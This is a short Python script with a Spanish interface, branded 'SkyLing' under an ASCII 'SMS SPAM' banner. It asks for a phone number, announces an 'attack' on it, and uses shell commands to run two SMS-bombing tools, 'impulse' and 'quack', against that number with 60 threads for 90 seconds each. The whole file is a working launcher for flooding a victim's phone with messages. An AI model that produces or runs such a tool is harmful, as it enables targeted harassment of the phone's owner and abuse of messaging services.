import os
import colorama
from colorama import Fore,init
from colorama import Fore, Style
from time import sleep
verde = Fore.GREEN
c = Fore.CYAN
rojo = Fore.RED
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
b = Fore.WHITE
reset = Fore.RESET
a = Fore.YELLOW
blue = Fore.BLUE
os.system("cls")

banner = f"""
{c}  ██████  ███▄ ▄███▓  ██████   ██████  ██▓███   ███▄ ▄███▓
{c}▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒ ▒██    ▒ ▓██░  ██▒▓██▒▀█▀ ██▒
{b}░ ▓██▄   ▓██    ▓██░░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▓██    ▓██░
{b}  ▒   ██▒▒██    ▒██   ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██    ▒██ 
{c}▒██████▒▒▒██▒   ░██▒▒██████▒▒▒██████▒▒▒██▒ ░  ░▒██▒   ░██▒
{c}▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░   ░  ░
{c}░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░     ░  ░      ░
{c}░  ░  ░  ░      ░   ░  ░  ░  ░  ░  ░  ░░       ░      ░   
{c}      ░         ░         ░        ░                  ░   
{blue}                                           💣  SkyLing  💣                                                       
"""
print (banner)
print ("EJEMPLO: +5491189898989")
try:
    numero = int(input(f"{a}Numero:{reset} "))
except ValueError:
    print ("incorrecto, porfavor vuelva a intentarlo")
    numero = int(input(f"{a}Numero:{reset} "))
sleep(1.5)
print (f"comenzando el ataque al numero: {numero}")
def attack():
    os.system("cls")
    banner2 = """
       _____   __    __                 __    
      /  _  \_/  |__/  |______    ____ |  | __
     /  /_\  \   __\   __\__  \ _/ ___\|  |/ /
    /    |    \  |  |  |  / __ \\  \___|    < 
    \____|__  /__|  |__| (____  /\___  >__|_ \
            \/                \/     \/     \/
    """
    print (verde+banner2)
    sleep(1)
    os.system(f"cd ataque && cd impulse && python impulse.py --method SMS --time 90 --threads 60 --target {numero}")
    os.system(f"cd ataque && cd quack && python quack --tool SMS --target {numero} --threads 60 --timeout 90")
    print ("ataque terminado.")

attack()